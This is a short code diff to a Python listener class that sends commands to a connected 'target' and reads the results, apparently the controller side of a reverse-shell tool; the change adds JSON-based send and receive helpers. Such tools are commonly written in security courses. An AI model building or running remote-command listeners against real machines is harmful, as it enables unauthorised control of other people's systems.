@@ -4,6 +4,7 @@
 
 import optparse
 import socket
+import json
 
 
 def get_arguments():
@@ -32,9 +33,19 @@ class Listener:
         print('[+] Connection from ' + str(address) + '.')
 
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+
+    def reliable_receive(self):
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data)
+
+
     def execute_remotely(self, command):
-        self.connection.send(command)  # sends command to target
-        return self.connection.recv(1024)  # receives in 1024 byte chunks
+        self.reliable_send(command)  # sends command to target
+        return self.reliable_receive()
 
 
     def run(self):
